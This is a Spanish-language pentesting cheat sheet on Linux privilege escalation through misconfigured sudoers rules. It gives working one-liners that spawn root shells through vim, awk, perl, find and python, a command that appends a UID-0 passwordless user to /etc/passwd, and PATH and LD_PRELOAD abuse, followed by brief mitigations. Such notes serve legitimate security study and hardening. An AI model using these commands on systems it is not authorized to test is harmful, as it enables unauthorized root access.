
---
Tags: #privilege-escalation #sudo #linux #pentesting #sudoers

---
## 📌 Definición

- El archivo **`/etc/sudoers`** controla qué usuarios pueden ejecutar comandos con privilegios elevados (root u otros usuarios).
    
- Una configuración incorrecta en **sudoers** puede permitir a un atacante **elevar privilegios hasta root**.
    

---

## 🔍 Métodos de Detección

|Comando|Uso|
|---|---|
|`sudo -l`|Lista los comandos que el usuario actual puede ejecutar con sudo.|
|`cat /etc/sudoers`|(si se tiene acceso) Ver reglas explícitas.|
|`ls -la /etc/sudoers`|Comprobar permisos del archivo.|
|`sudoedit -s /etc/passwd`|Intentar edición si está permitido.|

---

## ⚔️ Vectores Comunes de Explotación

### 1️⃣ Ejecución sin contraseña

Si en `sudoers` aparece:

`username ALL=(ALL) NOPASSWD: ALL`

👉 El usuario puede ejecutar **cualquier comando como root sin password**:

`sudo su -`

---

### 2️⃣ Binarios específicos explotables

Ejemplo en `sudo -l`:

`(username) ALL=(ALL) NOPASSWD: /usr/bin/vim`

👉 Ejecutar un **shell root** desde `vim`:

`sudo vim -c ':!/bin/sh'`

Otros binarios comunes con escalada (según GTFOBins):

|Binario|Escalada|
|---|---|
|`less`|`sudo less /etc/passwd` → `!sh`|
|`man`|`sudo man man` → `!sh`|
|`awk`|`sudo awk 'BEGIN {system("/bin/sh")}'`|
|`perl`|`sudo perl -e 'exec "/bin/sh";'`|
|`find`|`sudo find / -exec /bin/sh \;`|
|`python`|`sudo python -c 'import os; os.system("/bin/sh")'`|

---

### 3️⃣ Abuso de `sudoedit`

Si el usuario puede usar `sudoedit` sobre archivos sensibles:

`(username) ALL=(ALL) NOPASSWD: sudoedit /etc/passwd`

👉 Se puede editar `/etc/passwd` y establecer un usuario con contraseña vacía o UID 0.

Ejemplo para añadir root falso:

`echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd su hacker`

---

### 4️⃣ Uso de rutas relativas o variables de entorno

Si `sudoers` permite un binario con **ruta relativa**:

`(username) ALL=(ALL) NOPASSWD: script.sh`

👉 Crear un binario malicioso `script.sh` en `$PATH` y ejecutar:

`sudo script.sh`

Si `env_keep` en `sudoers` mantiene variables como `LD_PRELOAD` o `PATH`, pueden manipularse para inyectar librerías o binarios.

---

### 5️⃣ Uso de `ALL` con restricciones parciales

Si la regla es demasiado permisiva:

`username ALL=(ALL) NOPASSWD: /usr/bin/python3 *`

👉 Se pueden ejecutar scripts arbitrarios como root:

`echo 'import os; os.system("/bin/sh")' > root.py sudo python3 root.py`

---

## 🛡️ Mitigación

- Restringir comandos en sudoers estrictamente.
    
- Usar rutas absolutas y sin comodines (`*`).
    
- Evitar `NOPASSWD` salvo casos imprescindibles.
    
- Revisar configuraciones con **auditorías periódicas**.
    

---

# Referencias

- GTFO bins: [Enlace](https://gtfobins.github.io/)